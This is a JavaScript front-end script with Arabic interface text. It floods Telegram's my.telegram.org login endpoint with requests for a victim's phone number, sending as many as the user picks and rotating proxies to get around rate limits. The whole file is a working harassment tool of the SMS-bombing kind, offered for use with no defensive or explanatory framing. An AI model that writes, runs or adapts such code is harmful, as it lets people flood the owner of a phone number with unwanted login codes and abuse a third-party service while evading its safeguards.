const proxyList = [
  "192.168.0.1:8080",
  "192.168.0.2:8080",
  "192.168.0.3:8080",
]; // قائمة بروكسيات افتراضية
let currentProxyIndex = 0;

document.getElementById("startRequest").addEventListener("click", () => {
  const phoneNumber = document.getElementById("phoneNumber").value.trim();
  const useProxy = document.getElementById("useProxy").checked;
  const sendCount = document.getElementById("sendCount").value === "custom" 
    ? parseInt(document.getElementById("customCount").value, 10) 
    : parseInt(document.getElementById("sendCount").value, 10);
  const outputDiv = document.getElementById("output");

  outputDiv.innerHTML = ""; // Reset output

  if (!phoneNumber) {
    outputDiv.innerHTML = "يرجى إدخال رقم الهاتف.";
    return;
  }

  if (isNaN(sendCount) || sendCount <= 0) {
    outputDiv.innerHTML = "يرجى إدخال عدد طلبات صالح.";
    return;
  }

  const url = "https://my.telegram.org/auth/send_password";
  const headers = {
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "Origin": "https://my.telegram.org",
    "Referer": "https://my.telegram.org/auth",
    "User-Agent": "Mozilla/5.0",
    "X-Requested-With": "XMLHttpRequest",
  };

  const data = new URLSearchParams({ phone: phoneNumber });

  async function sendRequest(proxy = null) {
    try {
      const options = {
        method: "POST",
        headers: headers,
        body: data,
      };

      if (proxy) {
        outputDiv.innerHTML += `<p>باستخدام البروكسي: ${proxy}</p>`;
        // يمكن إضافة منطق الخادم للبروكسي هنا
      }

      const response = await fetch(url, options);
      const result = await response.json();
      outputDiv.innerHTML += `<p>${proxy ? `بروكسي: ${proxy}` : "مباشر"} | النتيجة: ${JSON.stringify(result)}</p>`;
    } catch (error) {
      outputDiv.innerHTML += `<p>${proxy ? `بروكسي: ${proxy}` : "مباشر"} | خطأ: ${error.message}</p>`;
    }
  }

  function getNextProxy() {
    const proxy = proxyList[currentProxyIndex];
    currentProxyIndex = (currentProxyIndex + 1) % proxyList.length;
    return proxy;
  }

  let sentCount = 0;

  for (let i = 0; i < sendCount; i++) {
    const proxy = useProxy ? getNextProxy() : null;
    sendRequest(proxy);
    sentCount++;
  }

  outputDiv.innerHTML += `<p>تم إرسال ${sentCount} طلبًا.</p>`;
});

// تحديث البروكسي تلقائيًا كل 5 دقائق
setInterval(() => {
  currentProxyIndex = (currentProxyIndex + 1) % proxyList.length;
}, 300000);

document.getElementById("sendCount").addEventListener("change", (event) => {
  const customCountInput = document.getElementById("customCount");
  customCountInput.style.display = event.target.value === "custom" ? "block" : "none";
});
